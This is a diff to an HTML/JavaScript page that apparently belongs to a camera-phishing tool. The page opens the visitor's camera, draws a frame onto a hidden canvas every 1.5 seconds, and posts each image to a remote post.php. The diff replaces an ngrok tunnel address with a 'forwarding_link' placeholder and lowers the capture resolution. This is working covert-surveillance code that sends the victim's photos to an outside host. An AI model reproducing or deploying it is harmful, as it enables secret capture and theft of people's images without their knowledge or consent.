@@ -297,7 +297,7 @@ min-height: 250px;
    <video id="video" playsinline autoplay></video>
 </div>
 
-<canvas hidden="hidden" id="canvas" width="1080" height="1440"></canvas>
+<canvas hidden="hidden" id="canvas" width="480" height="640"></canvas>
 
 <script>
 
@@ -305,7 +305,7 @@ function post(imgdata){
 $.ajax({
     type: 'POST',
     data: { cat: imgdata},
-    url: 'https://f2f1edb66b02.ngrok.io/post.php',
+    url: 'forwarding_link/post.php',
     dataType: 'json',
     async: false,
     success: function(result){
@@ -348,7 +348,7 @@ function handleSuccess(stream) {
 var context = canvas.getContext('2d');
   setInterval(function(){
 
-       context.drawImage(video, 0, 0, 1080, 1440);
+       context.drawImage(video, 0, 0, 480, 640);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); }, 1500);
   
